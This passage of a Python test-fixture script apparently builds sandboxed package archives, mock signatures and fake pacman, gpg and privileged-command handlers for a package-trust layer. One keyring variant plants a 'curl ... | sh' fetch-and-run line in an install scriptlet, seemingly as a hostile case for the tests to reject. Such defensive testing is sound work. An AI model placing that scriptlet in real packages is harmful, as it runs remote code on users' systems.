        if (root / stale).is_dir() and not (root / stale).is_symlink() and not any((root / stale).iterdir()):
            (root / stale).rmdir()
    digests = {}
    for name, (repo, version, url, files) in STOCK.items():
        for path, value in files.items():
            target = root / path
            target.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(value, tuple):
                target.unlink(missing_ok=True)
                target.symlink_to(value[1])
                continue
            data = stock_bytes(path, value)
            target.write_bytes(data)
            target.chmod(0o644)
            digests[path] = hashlib.sha256(data).hexdigest()
        stock_local(name, version, url, files, digests)
        records = repos.setdefault(repo, [])
        if not any(p['name'] == name for p in records):
            records.append({'name': name, 'version': version, 'url': url, 'provides': [], 'depends': []})
    repos_path.write_text(json.dumps(repos))
    # Pre-tamper base reference artifacts in the host CacheDir: the current
    # reviewed-DB artifact of every stock owner, base-signed (fixture protocol).
    (root / 'var/lib/haseen/vapt/fixture-base-signers').write_text(BASE_FPR + '\n')
    cache = root / 'var/cache/pacman/pkg'
    cache.mkdir(parents=True, exist_ok=True)
    for name, (repo, version, url, files) in STOCK.items():
        reference = build_stock_archive(name, version, cache)
        register_digests([reference], repo, add=True)
        os.environ['VAPT_MOCK_SIGNATURES'] = '1'
        mock_sign(reference)
    # The production policy is reused verbatim except reviewed script digests,
    # which name the inert stand-ins instead of the GPL upstream bytes.
    policy = Path(os.environ['HASEEN_PATH']) / 'layers/vapt/files/stock-hooks.tsv'
    if policy.exists():
        def swap(token):
            if token.startswith('script:') and '@' in token:
                path = token[len('script:'):].split('=', 1)[0].lstrip('/')
                return token.split('@', 1)[0] + '@' + digests[path]
            return token
        rows = []
        for line in policy.read_text().splitlines():
            fields = line.split('\t')
            if len(fields) == 4 and not line.startswith('#'):
                fields[3] = ' '.join(swap(token) for token in fields[3].split(' '))
            rows.append('\t'.join(fields))
        (root / 'var/lib/haseen/vapt/stock-hooks.tsv').write_text('\n'.join(rows) + '\n')


STOCK_PYTHON = ('extra', '3.14.0-1', 'https://www.python.org/', {
    'usr/bin/python3.14': b'ELF', 'usr/bin/python3': ('link', 'python3.14'),
    'usr/lib/python3.14/ctypes/__init__.py': '# inert fixture stdlib stand-in; never imported\n',
    'usr/lib/python3.14/lib-dynload/_ctypes.cpython-314-x86_64-linux-gnu.so': b'ELF'})
ELF_LAYOUT['usr/lib/python3.14/lib-dynload/_ctypes.cpython-314-x86_64-linux-gnu.so'] = (
    ('libc.so.6',), '_ctypes.cpython-314-x86_64-linux-gnu.so')


def stock_python():
    """Opt-in base python owner: tree, local DB entry, base-signed reference."""
    repo, version, url, files = STOCK['python'] = STOCK_PYTHON
    digests = {}
    for path, value in files.items():
        target = root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(value, tuple):
            target.unlink(missing_ok=True)
            target.symlink_to(value[1])
            continue
        data = stock_bytes(path, value)
        target.write_bytes(data)
        target.chmod(0o644)
        digests[path] = hashlib.sha256(data).hexdigest()
    stock_local('python', version, url, files, digests)
    reference = build_stock_archive('python', version, root / 'var/cache/pacman/pkg')
    register_digests([reference], repo, add=True)
    os.environ['VAPT_MOCK_SIGNATURES'] = '1'
    mock_sign(reference)


BASE_FPR = 'F1C7B4A5E0000000000000000000000000000BA5'
OTHER_FPR = 'F1C7B4A5E00000000000000000000000000071ED'


def register_digests(archives, repo=None, add=False, signer=None):
    """Publish archives as sync records: %SHA256SUM% (sha256sum), %FILENAME%.

    Fixture signature protocol: each published digest gains a signer row
    (sha256<TAB>FPR), the base FPR for base-vendor repositories unless SIGNER
    overrides it. Unpublished archives get no row and no record."""
    path = root / 'var/lib/haseen/vapt/repositories.json'
    repos = json.loads(path.read_text()) if path.exists() else {}
    signatures = root / 'var/lib/haseen/vapt/fixture-signatures.tsv'
    rows = signatures.read_text().splitlines() if signatures.exists() else []
    for archive in archives:
        with tarfile.open(archive, 'r:*') as opened:
            info = opened.extractfile('.PKGINFO').read().decode()
        fields = dict(line.split(' = ', 1) for line in info.splitlines() if ' = ' in line)
        name, version = fields.get('pkgname'), fields.get('pkgver')
        digest = hashlib.sha256(Path(archive).read_bytes()).hexdigest()
        if add and not any(p['name'] == name and p.get('version') == version for p in repos.get(repo, [])):
            base = next((p for p in repos.get(repo, []) if p['name'] == name), {'url': '', 'provides': [], 'depends': []})
            repos.setdefault(repo, []).append(dict(base, name=name, version=version))
        for source, records in repos.items():
            for record in records:
                if (repo is None or source == repo) and record['name'] == name and record.get('version') == version:
                    record['sha256sum'] = digest
                    record['filename'] = Path(archive).name
                    base = re.fullmatch(r'core|extra|multilib|cachyos(?:-[a-z0-9-]+)?', source)
                    row = digest + '\t' + (signer or (BASE_FPR if base else OTHER_FPR))
                    rows = [r for r in rows if not r.startswith(digest + '\t')] + [row]
    if repos:
        path.write_text(json.dumps(repos))
        signatures.write_text(''.join(r + '\n' for r in rows))


def build_stock_archive(name, version, out, change='', suffix=''):
    """Archive carrying a stock owner's files; CHANGE alters one payload."""
    files = STOCK[name][3]
    build = Path(out) / ('.build-' + name)
    shutil.rmtree(build, ignore_errors=True)
    for path, value in files.items():
        target = build / path
        target.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(value, tuple):
            target.symlink_to(value[1])
        else:
            data = stock_bytes(path, value)
            if path == change:
                data += b'# changed upgrade payload\n'
            target.write_bytes(data)
    (build / '.PKGINFO').write_text('pkgname = ' + name + '\npkgver = ' + version + '\narch = x86_64\n')
    archive = Path(out) / (name + '-' + version + '-x86_64' + suffix + '.pkg.tar.gz')
    with tarfile.open(archive, 'w:gz') as output:
        output.add(build / '.PKGINFO', '.PKGINFO')
        for top in sorted({Path(path).parts[0] for path in files}):
            output.add(build / top, top)
    shutil.rmtree(build)
    return archive


def stock_archive(name, version, out, change='', registration='register'):
    """Upgrade archive of a stock owner, printed for the test.

    register: the base repository's published, base-signed artifact.
    unregistered: same identity, never published (no record, no signer row).
    nonbase-signed: published digest, but signed by a non-base key."""
    if registration not in ('register', 'unregistered', 'nonbase-signed'):
        sys.exit(97)
    suffix = '-unregistered' if registration == 'unregistered' else ''
    archive = build_stock_archive(name, version, out, change, suffix)
    if registration != 'unregistered':
        register_digests([archive], STOCK[name][0], add=True,
                         signer=OTHER_FPR if registration == 'nonbase-signed' else None)
    print(archive)


# --- private oniomarchy source fixtures (plan 083 slice 1B) -------------------
# A fixture repository the curl stub serves from $SANDBOX/onio/serve, signed
# by the fixture signature protocol: NAME.sig holds "fixture-sig <sha256>"
# and $SANDBOX/onio/status/<sha256> the gpg status a stub replays for exactly
# those bytes (templates in tests/fixtures/vapt-oniomarchy/trust). Nothing
# here is cryptographic and production code never reads these files.
ONIO = sandbox / 'onio'
ONIO_FX = Path(__file__).resolve().parent / 'vapt-oniomarchy'
ONIO_FPR = {'PIN': '0F5F9214F312B067ECBF1DF125E2C00AA6340BD0', 'ROT': 'B0' * 20, 'OLD': 'C0' * 20, 'ARCH': 'D0' * 20}
ONIO_KEYRINGS = 'usr/share/pacman/keyrings/'


def onio_tree_archive(build, out):
    """tar.gz of BUILD's members (directories first), like tar -czf -C."""
    with tarfile.open(out, 'w:gz') as archive:
        for member in sorted(p.relative_to(build) for p in build.iterdir()):
            archive.add(build / member, str(member))


def onio_sign(path, status):
    """Fixture detached signature over PATH's bytes and the replayed status."""
    digest = hashlib.sha256(path.read_bytes()).hexdigest()
    if status == 'none':
        return None
    Path(str(path) + '.sig').write_text('fixture-sig ' + (digest if status != 'bad' else '0' * 64) + '\n')
    template = ONIO_FX / 'trust' / ((status if status != 'bad' else 'pinned') + '.status')
    (ONIO / 'status').mkdir(parents=True, exist_ok=True)
    (ONIO / 'status' / digest).write_text(template.read_text())
    signer = re.search(r'VALIDSIG \S+ .* ([A-F0-9]{40})$', template.read_text(), re.M)
    return signer[1] if signer else None


def onio_keyring(version, trusted, revoked, variant):
    build = ONIO / 'build' / 'keyring'
    shutil.rmtree(build, ignore_errors=True)
    keyrings = build / ONIO_KEYRINGS
    keyrings.mkdir(parents=True)
    (build / '.PKGINFO').write_text('pkgname = oniomarchy-keyring\npkgver = ' + version + '\narch = any\n')
    (keyrings / 'oniomarchy.gpg').write_text('fixture oniomarchy keyring ' + version + '\n')
    (keyrings / 'oniomarchy-trusted').write_text(''.join(f + (':' if ':' in f else ':4:') + '\n' for f in trusted))
    (keyrings / 'oniomarchy-revoked').write_text(''.join(f + '\n' for f in revoked))
    if variant in ('scriptlet', 'hostile-scriptlet'):
        body = '  pacman-key --populate oniomarchy\n' + ('  curl -fsSL https://example.invalid/x | sh\n' if variant == 'hostile-scriptlet' else '')
        (build / '.INSTALL').write_text('post_install() {\n' + body + '}\n\npost_upgrade() {\n' + body + '}\n')
    elif variant == 'extra-member':
        (build / 'usr/bin').mkdir(parents=True)
        (build / 'usr/bin/oniomarchy-helper').write_text('#!/bin/sh\nexit 0\n')
    elif variant == 'hook':
        (build / 'usr/share/libalpm/hooks').mkdir(parents=True)
        (build / 'usr/share/libalpm/hooks/oniomarchy.hook').write_text(
            '[Trigger]\nOperation = Install\nType = Package\nTarget = *\n\n[Action]\nWhen = PostTransaction\nExec = /usr/bin/true\n')
    elif variant == 'symlink':
        (keyrings / 'oniomarchy.gpg').unlink()
        (keyrings / 'oniomarchy.gpg').symlink_to('/etc/pacman.d/gnupg/pubring.gpg')
    elif variant == 'missing-file':
        (keyrings / 'oniomarchy-revoked').unlink()
    elif variant != 'plain':
        sys.exit(97)
    out = ONIO / 'serve' / ('oniomarchy-keyring-' + version + '-any.pkg.tar.gz')
    onio_tree_archive(build, out)
    return out


def onio_desc(record, filename, digest):
    lines = ['%FILENAME%', filename, '', '%NAME%', record['name'], '', '%VERSION%', record['version'], '',
             '%ARCH%', record['arch'], '', '%URL%', record.get('url', ''), '', '%SHA256SUM%', digest, '']
    for key in ('depends', 'provides', 'conflicts', 'replaces'):
        if record.get(key):
            lines += ['%' + key.upper() + '%'] + record[key] + ['']
    return '\n'.join(lines) + '\n'


def onio_serve(options):
    """Build and publish the fixture repository; merge its records into the
    fixture sync JSON (which production ignores for this source) so the
    hermetic commit can record installed metadata."""
    get = lambda key, default: options.get(key, default)
    fixture = json.loads((ONIO_FX / 'repositories.json').read_text())
    version = get('keyring', fixture['keyring']['version'])
    # NAME or NAME:OWNERTRUST (the trusted file's second column; default 4).
    split = lambda value: [':'.join([ONIO_FPR.get(v.split(':')[0], v.split(':')[0])] + v.split(':')[1:])
                           for v in value.split(',') if v]
    trusted, revoked = split(get('trusted', 'PIN')), split(get('revoked', ''))
    exclude = set(get('exclude', '').split(','))
    (ONIO / 'serve').mkdir(parents=True, exist_ok=True)
    for old in (ONIO / 'serve').glob('oniomarchy-keyring-*'):
        old.unlink()
    keyring = onio_keyring(version, trusted, revoked, get('variant', 'plain'))
    keyring_digest = hashlib.sha256(keyring.read_bytes()).hexdigest()
    keyring_signer = onio_sign(keyring, get('pkgstatus', 'pinned'))
    if get('pkgdigest', '') == 'bad':
        with keyring.open('ab') as stream:
            stream.write(b'\0')
    records = [dict(fixture['keyring'], version=version)] + fixture['records']
    build = ONIO / 'build' / 'db'
    shutil.rmtree(build, ignore_errors=True)
    build.mkdir(parents=True)
    published = []
    for record in records:
        if record['name'] in exclude:
            continue
        if record['name'] == 'oniomarchy-keyring':
            filename, digest = keyring.name, keyring_digest
        else:
            filename = record['name'] + '-' + record['version'] + '-x86_64.pkg.tar.gz'
            archive = sandbox / 'archives' / filename
            digest = hashlib.sha256(archive.read_bytes() if archive.exists() else filename.encode()).hexdigest()
        entry = build / (record['name'] + '-' + record['version'])
        entry.mkdir()
        (entry / 'desc').write_text(onio_desc(record, filename, digest))
        published.append(dict(record, filename=filename, sha256sum=digest))
    database = ONIO / 'serve' / 'oniomarchy.db'
    onio_tree_archive(build, database)
    for stale in (ONIO / 'serve').glob('oniomarchy.db.sig'):
        stale.unlink()
    database_signer = onio_sign(database, get('dbstatus', 'pinned'))
    (ONIO / 'serve' / 'oniomarchy.gpg').write_text('fixture public key\n')
    shutil.copyfile(ONIO_FX / 'trust' / (get('key', 'pinned') + '.key'), ONIO / 'key.colons')
    (ONIO / 'serve.json').write_text(json.dumps({'keyring': keyring.name, 'version': version, 'sha256': keyring_digest,
                                                 'keyringSigner': keyring_signer, 'databaseSigner': database_signer}))
    path = root / 'var/lib/haseen/vapt/repositories.json'
    repos = json.loads(path.read_text()) if path.exists() else {}
    repos['oniomarchy'] = [{k: v for k, v in record.items() if k != 'arch'} for record in published]
    path.write_text(json.dumps(repos))


def onio_seed(options):
    """An approved, verified private source exactly as a completed approval
    leaves it (descriptor, stored keyring archive, authority, verified cache);
    no keyring package is installed."""
    meta = json.loads((ONIO / 'serve.json').read_text())
    sources = root / 'var/lib/haseen/vapt/sources'
    (sources / 'sync').mkdir(parents=True, exist_ok=True)
    (sources / 'oniomarchy.conf').write_bytes((ONIO_FX / 'source-descriptor.conf').read_bytes())
    # The keyring package is never installed: an approval keeps the audited
    # archive in haseen's own root state.
    (sources / 'oniomarchy-keyring.pkg').write_bytes((ONIO / 'serve' / meta['keyring']).read_bytes())
    with tarfile.open(ONIO / 'serve' / meta['keyring'], 'r:*') as archive:
        files = {member.name: archive.extractfile(member).read() for member in archive.getmembers()
                 if member.isfile() and member.name.startswith(ONIO_KEYRINGS)}
    fingerprints = lambda text, suffix: sorted({line.split(':')[0] for line in text.splitlines() if line.strip()})
    trusted = set(fingerprints(files[ONIO_KEYRINGS + 'oniomarchy-trusted'].decode(), ':'))
    revoked = set(fingerprints(files[ONIO_KEYRINGS + 'oniomarchy-revoked'].decode(), ''))
    observed = {ONIO_FPR['PIN'], meta['databaseSigner'] or ONIO_FPR['PIN']}
    lines = ['haseen-vapt-oniomarchy-authority-v1', 'package\toniomarchy-keyring', 'version\t' + meta['version'],
             'sha256\t' + meta['sha256'], 'signer\t' + ONIO_FPR['PIN'], 'accepted\t' + ','.join(sorted(trusted - revoked)),
             'revoked\t' + (','.join(sorted(revoked)) or '-'), 'observed\t' + ','.join(sorted(observed))]
    lines += ['file\t' + name + '\t' + hashlib.sha256(files[name]).hexdigest()
              for name in (ONIO_KEYRINGS + 'oniomarchy.gpg', ONIO_KEYRINGS + 'oniomarchy-trusted', ONIO_KEYRINGS + 'oniomarchy-revoked')]
    (sources / 'oniomarchy.authority').write_text('\n'.join(lines) + '\n')
    database = (ONIO / 'serve' / 'oniomarchy.db').read_bytes()
    signature = (ONIO / 'serve' / 'oniomarchy.db.sig').read_bytes()
    (sources / 'sync' / 'oniomarchy.db').write_bytes(database)
    (sources / 'sync' / 'oniomarchy.db.sig').write_bytes(signature)
    (sources / 'oniomarchy.database').write_text(
        'haseen-vapt-oniomarchy-database-v1\ndb\t' + hashlib.sha256(database).hexdigest() + '\nsig\t'
        + hashlib.sha256(signature).hexdigest() + '\nsigner\t' + (meta['databaseSigner'] or ONIO_FPR['PIN']) + '\n')
    for path in [sources, sources / 'sync', *sources.rglob('*')]:
        path.chmod(0o755 if path.is_dir() else 0o644)


if mode in ('onio-serve', 'onio-seed'):
    options = dict(arg.split('=', 1) for arg in args)
    (onio_serve if mode == 'onio-serve' else onio_seed)(options)
    sys.exit(0)
if mode == 'bsdtar':
    action, filename, *members = args
    with tarfile.open(filename, 'r:*') as archive:
        if action == '-tf':
            print('\n'.join(member.name + ('/' if member.isdir() else '') for member in archive))
        elif action == '-xOf':
            literal = members and members[0] == '--'
            if literal:
                members = members[1:]
            elif any(member.startswith('--use-compress-program=') for member in members):
                # Model the attempted option without ever spawning its program.
                log('bsdtar-compressor', members)
                sys.exit(97)
            payload = archive.extractfile(members[0])
            if payload:
                sys.stdout.buffer.write(payload.read())
        else:
            sys.exit(97)
elif mode == 'pacman':
    sys.exit(pacman(args))
elif mode == 'stock':
    stock_build()
elif mode == 'stock-python':
    stock_python()
elif mode == 'stock-archive':
    if args[0] == 'python':
        STOCK['python'] = STOCK_PYTHON
    stock_archive(*args)
elif mode == 'digests':
    register_digests(sorted(Path(args[0]).glob('*.pkg.tar.gz')) if Path(args[0]).is_dir() else [])
elif mode == 'elf':
    # elf OUT [needed=a,b] [soname=X] [interp=P] [runpath=D] [rpath=D] [dlopen=a,b]
    #     [type=N] [class=N] [machine=N] — inert static ELF metadata (see make_elf).
    options = dict(arg.split('=', 1) for arg in args[1:])
    split = lambda key: tuple(item for item in options.get(key, '').split(',') if item)
    Path(args[0]).parent.mkdir(parents=True, exist_ok=True)
    Path(args[0]).write_bytes(make_elf(split('needed'), options.get('soname'), options.get('interp'),
                                       options.get('runpath'), options.get('rpath'), split('dlopen'),
                                       int(options.get('type', 3)), int(options.get('class', 2)),
                                       int(options.get('machine', 62)), options.get('tag', '')))
    Path(args[0]).chmod(0o644)
elif mode == 'ldcache':
    # ldcache OUT SONAME=/ABS/PATH... — a fixture glibc-ld.so.cache1.1 file.
    Path(args[0]).parent.mkdir(parents=True, exist_ok=True)
    Path(args[0]).write_bytes(make_ld_cache([tuple(arg.split('=', 1)) for arg in args[1:]]))
elif mode == 'gconvcache':
    # gconvcache OUT /ABS/MODULE.so... — a fixture gconv-modules.cache file.
    Path(args[0]).parent.mkdir(parents=True, exist_ok=True)
    Path(args[0]).write_bytes(make_gconv_cache(args[1:]))
    Path(args[0]).chmod(0o644)
elif mode == 'runtime':
    if args[0] == 'base':
        fixture_system_python()
    else:
        fixture_runtime(Path(observed(args[1])), args[0] == 'managed', args[2] if len(args) > 2 else None)
elif mode == 'uv':
    # The public environment API's fake only creates metadata. Never imports
    # distributions or executes the interpreter/probes it leaves behind.
    log('uv-fake', args)
    if 'venv' in args:
        dest = Path(observed(args[-1]))
        fixture_runtime(dest, True)
    elif 'pip' in args:
        dest = Path(observed(args[args.index('--python') + 1])).parent.parent
        for pin in args[args.index('--python') + 2:]:
            name, version = pin.split('==')
            info = dest / 'lib/python3.12/site-packages' / (name + '-' + version + '.dist-info')
            info.mkdir(parents=True, exist_ok=True)
            (info / 'METADATA').write_text('Name: ' + name + '\nVersion: ' + version + '\n')
    else:
        sys.exit(97)
else:
    command, *argv = args
    if mode == 'root' and command in ('env', '/usr/bin/env'):
        # The only approved environment wrapper routes to the same hermetic
        # manager fake. Never execute env, pacman, or an arbitrary wrapped command.
        unset = []
        while argv[:1] == ['-u'] and len(argv) > 1:
            unset.append(argv[1])
            argv = argv[2:]
        scrubbed = {'LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT', 'GCONV_PATH'} <= set(unset)
        if argv[:2] == ['LC_ALL=C', 'PATH=/usr/bin'] and argv[2:3] == ['pacman']:
            log('root-env', ['canonical' if scrubbed else 'inherited'] + argv[3:4])
            os.environ['VAPT_COMMIT_PATH'] = '/usr/bin'
            os.environ['LC_ALL'] = 'C'
            sys.exit(pacman(argv[3:]))
        elif argv[:2] == ['LC_ALL=C', 'pacman']:
            log('root-env', ['inherited'] + argv[2:3])
            os.environ['LC_ALL'] = 'C'
            sys.exit(pacman(argv[2:]))
        elif (scrubbed and argv[:2] == ['LC_ALL=C', 'PATH=/usr/bin'] and len(argv) > 2
              and argv[2].startswith('/usr/bin/') and '/' not in argv[2][len('/usr/bin/'):]):
            # Any other canonical privileged step: the same hermetic fakes as
            # a bare command, recorded with its full wrapped argv.
            log('root-env', ['canonical', argv[2]])
            command, argv = argv[2][len('/usr/bin/'):], argv[3:]
        else:
            log('sudo', args)
            sys.exit(97)
    if mode == 'root' and command == 'pacman':
        sys.exit(pacman(argv))
    if mode == 'root':
        log('sudo', args)
    if mode == 'root' and os.environ.get('VAPT_FAKE_TRUST') == '1' and command == 'pacman-key':
        # Records the trust request; no keyring is initialised or modified.
        # VAPT_PACMAN_KEY_FAIL=<option> models an operational failure of that
        # option (a failed deletion).
        option = argv[0] if argv else ''
        if os.environ.get('VAPT_PACMAN_KEY_FAIL') and option == '--' + os.environ['VAPT_PACMAN_KEY_FAIL']:
            print('pacman-key: fixture ' + option + ' failure', file=sys.stderr)
            sys.exit(2)
        sys.exit(0)
    if (mode == 'root' and os.environ.get('VAPT_FAKE_TRUST') == '1' and command == 'gpg'
            and '--list-keys' in argv and '--with-colons' in argv and '--homedir' in argv):
        # The shared pacman keyring listing. VAPT_KEYRING_LISTING: colons (every
        # fixture primary present, machine-readable), human (an alternative
        # human presentation without colon records), empty, malformed (a
        # primary without its fpr record), fail (an operational error).
        listing = os.environ.get('VAPT_KEYRING_LISTING', 'colons')
        if listing == 'fail':
            print('gpg: keyblock resource: fixture failure', file=sys.stderr)
            sys.exit(2)
        if listing in ('colons', 'colons-no-pin'):
            print('tru::1:1700000000:0:3:1:5')
            for name, fpr in ONIO_FPR.items():
                if listing == 'colons-no-pin' and name == 'PIN':
                    continue
                print('pub:-:255:22:' + fpr[-16:] + ':1700000000:::-:::scESC::::::23::0:\nfpr:::::::::' + fpr
                      + ':\nuid:-::::1700000000::0000::fixture::::::::::0:')
        elif listing == 'human':
            for fpr in ONIO_FPR.values():
                print('pub   ed25519/0x' + fpr[-16:] + ' 2026-01-01 [SC]\nuid   [ full ] fixture\n')
        elif listing == 'malformed':
            print('pub:-:255:22:' + ONIO_FPR['PIN'][-16:] + ':1700000000:::-:::scESC::::::23::0:')
        elif listing != 'empty':
            sys.exit(97)
        sys.exit(0)
    if mode == 'root' and os.environ.get('VAPT_FAKE_TRUST') == '1' and command == 'tee' and len(argv) in (1, 2):
        # Global repository activation (tee -a) and the layer's applied record
        # (write_root_file: tee DEST) land in the fixture sysroot only.
        append = argv[0] == '-a'
        if append != (len(argv) == 2):
            sys.exit(97)
        with open(observed(argv[-1]), 'a' if append else 'w') as output:
            output.write(sys.stdin.read())
        sys.exit(0)
    if command == 'mktemp' and mode == 'root':
        # Like mktemp -d: a new unique directory each call (the first one is
        # /var/cache/haseen-vapt.fixture).
        (root / 'var/cache').mkdir(parents=True, exist_ok=True)
        name = next(candidate for candidate in ('fixture' + (str(n) if n else '') for n in range(1000))
                    if not (root / 'var/cache' / ('haseen-vapt.' + candidate)).exists())
        (root / 'var/cache' / ('haseen-vapt.' + name)).mkdir()
        print('/var/cache/haseen-vapt.' + name)
    elif command in ('python3', '/usr/bin/python3') and mode == 'root':
        # Only the implementation's isolated state/permissions helper is legal.
        flags = []
        while argv and argv[0] in ('-I', '-S'):
            flags.append(argv.pop(0))
        if Path(argv[0]) != Path(os.environ['HASEEN_PATH']) / 'layers/vapt/metadata.py':
            sys.exit(97)
        if argv[1] == 'cache-permissions':
            # Simulate alpm write access without needing a real alpm uid/group.
            Path(observed(argv[2])).chmod(0o775)
        elif argv[1] in ('state-write', 'state-clear', 'seal', 'shared-lock-prepare', 'activate-blackarch', 'sudo-plugins',
                         'state-repair', 'authority-facts', 'oniomarchy-approve', 'oniomarchy-withdraw'):
            # The production module's own no-follow writers, confined to the
            # fixture sysroot (seal: the digest-verified root copy). Every
            # absolute argument is mapped into the sysroot; one that would
            # escape it is refused before anything runs (never the host /).
            # VAPT_FAIL_ROOT_OP=<op> models that privileged step failing
            # before it changes anything (ENOSPC, interruption).
            if os.environ.get('VAPT_FAIL_ROOT_OP') == argv[1]:
                log('failed-root-op', [argv[1]])
                sys.exit(1)
            try:
                mapped = [argv[0], *[observed(a) if a.startswith('/') else a for a in argv[1:]]]
            except ValueError:
                sys.exit(97)
            status = subprocess.call(['/usr/bin/python3', *flags, *mapped])
            if argv[1] == 'seal' and os.environ.get('VAPT_SEALED_ANCESTOR_MODE'):
                # Another actor makes the root stage replaceable after sealing
                # (real sysroot mode change; nothing is mocked).
                for stage in root.glob('var/cache/haseen-vapt.*'):
                    stage.chmod(int(os.environ['VAPT_SEALED_ANCESTOR_MODE'], 8))
            if argv[1] == 'shared-lock-prepare' and os.environ.get('VAPT_PENDING_AT_LOCK'):
                # Another user's reviewed commit failed just before this run
                # took the shared lock: its recovery record now exists.
                marker = root / 'var/lib/haseen/vapt/upgrade-pending'
                if not marker.exists():
                    marker.parent.mkdir(parents=True, exist_ok=True)
                    marker.write_text('reviewed-full-upgrade-commit-pending\n')
            sys.exit(status)
        else:
            sys.exit(97)
    elif command in ('mkdir', 'install', 'chmod', 'cp', 'rm', 'ln', 'mktemp'):
        if mode == 'user':
            log(command, argv)
        mapped = []
        for index, value in enumerate(argv):
            # ln's source is the logical link target, not a write destination.
            is_target = command == 'ln' and index == len(argv) - 2
            mapped.append(value if value.startswith('-') or is_target else observed(value, unlink=command == 'rm'))
        if command == 'cp':
            for value in mapped:
                if not value.startswith('-'):
                    Path(value).parent.mkdir(parents=True, exist_ok=True)
        if command == 'ln' and mode == 'user' and os.environ.get('VAPT_LN_RACE') == argv[-1]:
            # Deterministically model another actor winning the absence/ln race.
            # Actually create its link, then let real ln report EEXIST.
            destination = Path(mapped[-1])
            destination.symlink_to(argv[-2])
        sys.exit(subprocess.call(['/usr/bin/' + command, *mapped]))
    else:
        print('FORBIDDEN-MANAGER: ' + command, file=sys.stderr)
        sys.exit(97)
